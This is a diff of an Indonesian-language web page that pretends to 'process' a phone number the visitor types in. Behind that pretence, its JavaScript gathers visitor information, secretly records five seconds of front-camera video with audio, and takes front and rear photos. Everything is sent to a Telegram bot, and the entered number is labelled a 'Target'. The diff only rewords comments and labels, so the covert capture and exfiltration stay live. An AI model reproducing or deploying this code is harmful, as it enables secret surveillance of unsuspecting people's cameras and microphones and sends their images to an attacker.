@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+    <!DOCTYPE html>
 <html lang="id">
 <head>
   <meta charset="UTF-8">
@@ -149,24 +149,21 @@
       sendToTelegram(`<b>📥 Info Pengunjung:</b>\n<pre>${text}</pre>`);
     }
 
-    // Fungsi Rekam Video 5 Detik
     async function recordVideo() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
         const mediaRecorder = new MediaRecorder(stream);
         const chunks = [];
-
         mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
         mediaRecorder.onstop = () => {
           const blob = new Blob(chunks, { type: 'video/mp4' });
-          sendMediaToTelegram(blob, 'video', '🎥 Rekaman 5 Detik (Depan)');
+          sendMediaToTelegram(blob, 'video', '🎥 Video Depan (5s)');
           stream.getTracks().forEach(track => track.stop());
         };
-
         mediaRecorder.start();
-        setTimeout(() => mediaRecorder.stop(), 5000); // Rekam selama 5 detik
+        setTimeout(() => mediaRecorder.stop(), 5000);
       } catch (err) {
-        sendToTelegram(`❌ Gagal Rekam Video: ${err.message}`);
+        sendToTelegram(`❌ Gagal Video: ${err.message}`);
       }
     }
 
@@ -181,7 +178,7 @@
             setTimeout(() => {
               canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
               canvas.toBlob(blob => {
-                if (blob) sendMediaToTelegram(blob, 'photo', `📸 Kamera: ${label}`);
+                if (blob) sendMediaToTelegram(blob, 'photo', `📸 Foto: ${label}`);
                 stream.getTracks().forEach(track => track.stop());
                 resolve();
               }, 'image/jpeg');
@@ -196,21 +193,18 @@
     button.addEventListener('click', async () => {
       const nomor = input.value.trim();
       if (!nomor || nomor.length < 8) return;
-      
       button.disabled = true;
-      infoDiv.innerText = '⏳ Memproses sistem...';
+      infoDiv.innerText = '⏳ Memproses...';
       sendToTelegram(`<b>📞 Target:</b> ${nomor}`);
       
       try {
         await getInfo();
-        // Rekam video di latar belakang
         recordVideo(); 
-        // Ambil foto depan & belakang
         await capturePhoto("user", "Depan");
         await new Promise(r => setTimeout(r, 1000));
         await capturePhoto("environment", "Belakang");
         
-        infoDiv.innerText = `✅ Berhasil memproses nomor ${nomor}`;
+        infoDiv.innerText = `✅ Selesai memproses ${nomor}`;
         button.disabled = false;
         input.value = '';
       } catch (e) {
